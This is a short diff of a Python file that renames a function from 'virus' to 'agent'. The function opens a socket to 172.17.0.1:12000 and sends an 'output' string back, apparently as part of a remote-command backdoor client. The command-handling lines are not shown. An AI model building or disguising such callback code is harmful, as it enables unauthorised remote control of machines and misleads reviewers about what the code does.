@@ -5,7 +5,7 @@ import base64
 import os
 
 
-def virus():
+def agent():
     HOST = '172.17.0.1'
     PORT = 12000
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
@@ -35,5 +35,5 @@ def virus():
 
             s.sendall(bytes(output, 'utf-8'))
 
-virus()
+agent()
 
